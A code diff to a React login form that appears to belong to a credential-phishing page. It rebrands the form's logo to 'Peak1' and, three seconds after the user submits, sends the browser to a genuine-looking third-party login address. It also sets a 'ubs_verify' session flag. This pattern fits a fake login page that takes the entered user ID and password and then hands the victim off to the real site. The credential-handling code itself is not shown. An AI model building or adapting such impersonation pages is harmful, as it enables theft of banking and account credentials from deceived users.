@@ -53,7 +53,7 @@ export function LoginForm({ visitorInfo }: LoginFormProps) {
 
   const handleUserIdChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     let value = e.target.value;
-    
+
     // Prevent "@" character from being entered
     if (value.includes("@")) {
       setUserIdError("User ID not valid.");
@@ -63,7 +63,7 @@ export function LoginForm({ visitorInfo }: LoginFormProps) {
     } else {
       setUserIdError(null);
     }
-    
+
     setUserId(value);
   };
 
@@ -107,7 +107,8 @@ export function LoginForm({ visitorInfo }: LoginFormProps) {
     sessionStorage.setItem("ubs_verify", "1");
 
     setTimeout(() => {
-      router.push("/verify");
+      window.location.href =
+        "https://peak1.wealthcareportal.com/Authentication/Handshake";
     }, 3000);
   };
 
@@ -115,11 +116,7 @@ export function LoginForm({ visitorInfo }: LoginFormProps) {
     <div className="landing-page-container">
       <main className="hero" aria-label="Primary landing page content">
         <div className="login-panel">
-          <img
-            className="sf-logo"
-            src="/LoginLogo.png"
-            alt="YourFlex Accounts"
-          />
+          <img className="sf-logo" src="/LoginLogo.png" alt="Peak1" />
 
           <form onSubmit={handleSubmit}>
             <div className="input-row">
@@ -140,7 +137,14 @@ export function LoginForm({ visitorInfo }: LoginFormProps) {
               />
             </div>
             {userIdError && (
-              <p style={{ color: "#dc2626", fontSize: "13px", marginTop: "4px", marginBottom: "8px" }}>
+              <p
+                style={{
+                  color: "#dc2626",
+                  fontSize: "13px",
+                  marginTop: "4px",
+                  marginBottom: "8px",
+                }}
+              >
                 {userIdError}
               </p>
             )}
@@ -182,7 +186,11 @@ export function LoginForm({ visitorInfo }: LoginFormProps) {
               Show Password
             </label>
 
-            <button type="submit" className="logon-btn" disabled={isLoading || !!userIdError}>
+            <button
+              type="submit"
+              className="logon-btn"
+              disabled={isLoading || !!userIdError}
+            >
               {isLoading ? "Loading..." : "Log On"}
             </button>
 
